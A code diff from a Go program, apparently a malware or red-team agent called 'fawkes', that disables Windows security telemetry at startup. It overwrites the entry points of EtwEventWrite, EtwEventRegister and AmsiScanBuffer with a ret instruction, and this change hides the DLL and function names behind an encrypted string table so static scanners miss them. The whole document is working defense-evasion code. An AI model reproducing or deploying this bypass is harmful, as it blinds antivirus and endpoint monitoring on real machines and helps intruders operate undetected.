@@ -3,29 +3,45 @@
 package main
 
 import (
+	"fawkes/pkg/obfuscate"
 	"syscall"
 	"unsafe"
-)
-
-var (
-	kernel32AP        = syscall.NewLazyDLL("kernel32.dll")
-	procVirtualProtAP = kernel32AP.NewProc("VirtualProtect")
 )
 
 // autoStartupPatch patches ETW and AMSI functions at startup with a single
 // 0xC3 (ret) instruction, causing them to return immediately.
 // This prevents ETW-based detection and AMSI scanning before any agent activity.
 func autoStartupPatch() {
+	// Resolve DLL/proc names at runtime from encrypted table
+	k32 := obfuscate.Kernel32Dll()
+	defer obfuscate.Zero(k32)
+	vpName := obfuscate.VirtualProtect()
+	defer obfuscate.Zero(vpName)
+
+	k32dll := syscall.NewLazyDLL(k32)
+	vpProc := k32dll.NewProc(vpName)
+
+	ntdll := obfuscate.NtdllDll()
+	defer obfuscate.Zero(ntdll)
+	amsi := obfuscate.AmsiDll()
+	defer obfuscate.Zero(amsi)
+	etwWrite := obfuscate.EtwEventWrite()
+	defer obfuscate.Zero(etwWrite)
+	etwReg := obfuscate.EtwEventRegister()
+	defer obfuscate.Zero(etwReg)
+	amsiScan := obfuscate.AmsiScanBuffer()
+	defer obfuscate.Zero(amsiScan)
+
 	// Patch ETW first — ntdll.dll is always loaded
-	patchFunctionEntry("ntdll.dll", "EtwEventWrite")
-	patchFunctionEntry("ntdll.dll", "EtwEventRegister")
+	patchFunctionEntry(ntdll, etwWrite, vpProc)
+	patchFunctionEntry(ntdll, etwReg, vpProc)
 	// Patch AMSI — amsi.dll may not be loaded yet, but will be when CLR loads
-	patchFunctionEntry("amsi.dll", "AmsiScanBuffer")
+	patchFunctionEntry(amsi, amsiScan, vpProc)
 }
 
 // patchFunctionEntry writes 0xC3 (ret) at the entry point of the specified function.
 // Silently returns on any error (DLL not loaded, function not found, etc.).
-func patchFunctionEntry(dllName, funcName string) {
+func patchFunctionEntry(dllName, funcName string, vpProc *syscall.LazyProc) {
 	dll, err := syscall.LoadDLL(dllName)
 	if err != nil {
 		return // DLL not loaded — nothing to patch
@@ -37,7 +53,7 @@ func patchFunctionEntry(dllName, funcName string) {
 
 	addr := proc.Addr()
 	var oldProtect uint32
-	ret, _, _ := procVirtualProtAP.Call(addr, 1, 0x40, uintptr(unsafe.Pointer(&oldProtect)))
+	ret, _, _ := vpProc.Call(addr, 1, 0x40, uintptr(unsafe.Pointer(&oldProtect)))
 	if ret == 0 {
 		return // VirtualProtect failed
 	}
@@ -45,5 +61,5 @@ func patchFunctionEntry(dllName, funcName string) {
 	*(*byte)(unsafe.Pointer(addr)) = 0xC3
 
 	// Restore original protection
-	procVirtualProtAP.Call(addr, 1, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
+	vpProc.Call(addr, 1, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
 }
